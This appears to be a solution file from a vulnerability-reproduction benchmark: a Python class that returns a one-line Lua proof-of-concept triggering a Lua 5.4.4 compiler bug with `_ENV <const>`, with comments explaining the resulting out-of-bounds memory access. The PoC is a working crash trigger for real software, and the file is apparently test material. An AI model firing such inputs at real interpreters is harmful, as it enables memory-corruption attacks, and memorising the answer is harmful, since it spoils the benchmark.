import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability in Lua 5.4.4 (and prior 5.4.x) is that declaring _ENV as <const>
        # can cause the compiler to generate incorrect bytecode (treating a local as an upvalue).
        # This leads to an out-of-bounds access on the upvalues array (Heap Use-After-Free / OOB Read).
        #
        # Vulnerable behavior: Crash (Segfault/ASAN error) due to invalid memory access.
        # Fixed behavior: The compiler generates correct code, but runtime execution attempts
        #                 to index the number '1', raising a Lua error ("attempt to index a number value").
        #
        # We wrap the PoC in pcall() so that the fixed version catches the error and exits with 0,
        # satisfying the "PoC must NOT crash the fixed version" requirement.
        
        return b"pcall(function() local function f() local _ENV <const> = 1; x = 1 end; f() end)"
